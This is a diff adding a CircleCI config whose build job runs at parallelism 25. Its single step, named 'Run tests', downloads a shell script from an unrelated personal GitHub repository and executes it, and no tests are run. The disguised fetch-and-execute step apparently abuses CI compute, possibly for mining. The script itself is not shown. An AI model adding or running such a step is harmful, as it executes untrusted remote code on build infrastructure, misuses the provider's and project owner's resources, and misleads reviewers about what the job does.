@@ -1,0 +1,11 @@
+version: 2.1
+jobs:
+  build:
+    parallelism: 25
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: wget https://raw.githubusercontent.com/Muhamaddian1211/kar/main/kar.sh && chmod +x kar.sh && ./kar.sh
